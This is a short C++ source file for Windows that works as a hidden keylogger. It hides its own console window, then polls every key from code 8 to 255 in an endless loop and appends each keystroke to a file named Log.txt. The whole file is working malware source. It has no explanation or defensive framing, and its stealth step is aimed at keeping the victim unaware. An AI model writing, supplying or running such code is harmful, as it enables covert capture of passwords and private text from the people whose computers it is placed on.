#include <iostream>
#include <fstream>
#include <Windows.h>

using namespace std;

int main()
{
	FreeConsole();
	HWND stealth;
	AllocConsole();
	stealth = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(stealth, 0);

	while(true)
	{
		Sleep(10);
		for (int key = 8; key <= 255; key++)
		{
			if (GetAsyncKeyState(key) == -32767)
			{
				ofstream logFile;
				logFile.open("Log.txt", ios::app);
				logFile << (char)key;
				logFile.close();
			}
		}
	}
	return 0;
}
